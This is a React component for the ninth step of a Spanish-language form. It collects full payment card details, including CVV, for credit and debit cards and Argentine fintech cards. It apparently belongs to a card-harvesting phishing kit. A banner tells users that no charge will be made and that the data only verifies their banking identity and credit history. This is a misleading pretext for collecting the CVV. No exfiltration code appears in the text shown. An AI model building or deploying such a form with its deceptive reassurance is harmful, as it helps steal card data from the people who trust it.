import React, { useState } from 'react';
import { useFormContext } from '../context/FormContext';
import GlassMorphismCard from '../components/GlassMorphismCard';
import Input from '../components/Input';
import FormStepper from '../components/FormStepper';
import CreditCard from '../components/CreditCard';
import { CreditCard as CreditCardIcon, AlertTriangle } from 'lucide-react';

// Card types
const cardTypes = [
  'Crédito',
  'Débito',
  'Mercado Pago',
  'Uala',
  'Prex',
  'Brubank'
];

const Step9CardDetails: React.FC = () => {
  const { formData, updateFormData, theme } = useFormContext();
  const [errors, setErrors] = useState<Record<string, string>>({});
  
  const validateCardNumber = (number: string) => {
    // Remove spaces and other non-digit characters
    const cleanNumber = number.replace(/\D/g, '');
    return cleanNumber.length >= 15 && cleanNumber.length <= 16;
  };
  
  const validateExpiry = (expiry: string) => {
    const expiryPattern = /^(0[1-9]|1[0-2])\/\d{2}$/;
    if (!expiryPattern.test(expiry)) return false;
    
    const [month, year] = expiry.split('/');
    const expiryDate = new Date(2000 + parseInt(year), parseInt(month) - 1);
    const currentDate = new Date();
    
    return expiryDate > currentDate;
  };
  
  const validateCVV = (cvv: string) => {
    const cleanCVV = cvv.replace(/\D/g, '');
    return cleanCVV.length >= 3 && cleanCVV.length <= 4;
  };
  
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    let formattedValue = value;
    
    // Format card number with spaces
    if (name === 'cardNumber') {
      formattedValue = value
        .replace(/\D/g, '')
        .replace(/(.{4})/g, '$1 ')
        .trim();
    }
    
    // Format expiry date as MM/YY
    if (name === 'cardExpiry') {
      formattedValue = value
        .replace(/\D/g, '')
        .substring(0, 4);
      
      if (formattedValue.length > 2) {
        formattedValue = formattedValue.substring(0, 2) + '/' + formattedValue.substring(2);
      }
    }
    
    // Format CVV (numbers only)
    if (name === 'cardCvv') {
      formattedValue = value.replace(/\D/g, '').substring(0, 4);
    }
    
    updateFormData({ [name]: formattedValue });
    
    // Validate fields
    let error = '';
    
    if (name === 'cardNumber' && value && !validateCardNumber(value)) {
      error = 'Número de tarjeta inválido';
    } else if (name === 'cardExpiry' && value && !validateExpiry(value)) {
      error = 'Fecha de expiración inválida (MM/YY)';
    } else if (name === 'cardCvv' && value && !validateCVV(value)) {
      error = 'CVV inválido';
    } else if (name === 'cardName' && value && value.trim().length < 3) {
      error = 'Nombre inválido';
    }
    
    if (error) {
      setErrors(prev => ({ ...prev, [name]: error }));
    } else {
      setErrors(prev => {
        const newErrors = { ...prev };
        delete newErrors[name];
        return newErrors;
      });
    }
  };
  
  const handleCardTypeSelect = (type: string) => {
    updateFormData({ cardType: type });
  };
  
  const isValid = 
    formData.cardType &&
    formData.cardNumber && validateCardNumber(formData.cardNumber) &&
    formData.cardName && formData.cardName.trim().length >= 3 &&
    formData.cardExpiry && validateExpiry(formData.cardExpiry) &&
    formData.cardCvv && validateCVV(formData.cardCvv) &&
    Object.keys(errors).length === 0;

  return (
    <div className="max-w-xl mx-auto">
      <GlassMorphismCard>
        <div className="flex items-center mb-6">
          <div className={`w-10 h-10 rounded-full flex items-center justify-center mr-3 ${theme === 'light' ? 'bg-violet-100' : 'bg-violet-900/30'}`}>
            <CreditCardIcon className={`w-5 h-5 ${theme === 'light' ? 'text-violet-600' : 'text-violet-400'}`} />
          </div>
          <h2 className={`text-2xl font-bold ${theme === 'light' ? 'text-gray-800' : 'text-white'}`}>
            Detalles de tarjeta
          </h2>
        </div>
        
        <div className={`mb-6 p-4 rounded-lg flex items-center ${theme === 'light' ? 'bg-amber-50 text-amber-800' : 'bg-amber-900/20 text-amber-300'}`}>
          <AlertTriangle className="w-5 h-5 mr-2 flex-shrink-0" />
          <p className="text-sm">
            No se realizará ningún cargo. Solo utilizamos esta información para verificar tu identidad bancaria e historial crediticio.
          </p>
        </div>
        
        <CreditCard 
          cardNumber={formData.cardNumber}
          cardName={formData.cardName}
          cardExpiry={formData.cardExpiry}
          cardType={formData.cardType}
        />
        
        <div className="mb-6">
          <label className={`block text-sm font-medium mb-2 ${theme === 'light' ? 'text-gray-700' : 'text-gray-200'}`}>
            Tipo de tarjeta
          </label>
          <div className="grid grid-cols-2 gap-2">
            {cardTypes.map((type) => (
              <button
                key={type}
                className={`
                  p-3 rounded-xl text-center 
                  transition-all duration-200
                  ${formData.cardType === type 
                    ? 'bg-gradient-to-r from-violet-600 to-blue-500 text-white shadow-md' 
                    : theme === 'light'
                      ? 'bg-white/50 text-gray-800 hover:bg-white/80 border border-gray-200'
                      : 'bg-white/5 text-white hover:bg-white/10 border border-white/10'
                  }
                `}
                onClick={() => handleCardTypeSelect(type)}
              >
                {type}
              </button>
            ))}
          </div>
        </div>
        
        <div className="space-y-4">
          <Input
            type="text"
            name="cardNumber"
            label="Número de tarjeta"
            placeholder="1234 5678 9012 3456"
            value={formData.cardNumber}
            onChange={handleChange}
            error={errors.cardNumber}
            required
          />
          
          <Input
            type="text"
            name="cardName"
            label="Nombre en la tarjeta"
            placeholder="NOMBRE APELLIDO"
            value={formData.cardName}
            onChange={handleChange}
            error={errors.cardName}
            required
          />
          
          <div className="grid grid-cols-2 gap-4">
            <Input
              type="text"
              name="cardExpiry"
              label="Fecha de vencimiento"
              placeholder="MM/YY"
              value={formData.cardExpiry}
              onChange={handleChange}
              error={errors.cardExpiry}
              required
            />
            
            <Input
              type="text"
              name="cardCvv"
              label="CVV"
              placeholder="123"
              value={formData.cardCvv}
              onChange={handleChange}
              error={errors.cardCvv}
              required
            />
          </div>
        </div>
        
        <FormStepper canProceed={isValid} />
      </GlassMorphismCard>
    </div>
  );
};

export default Step9CardDetails;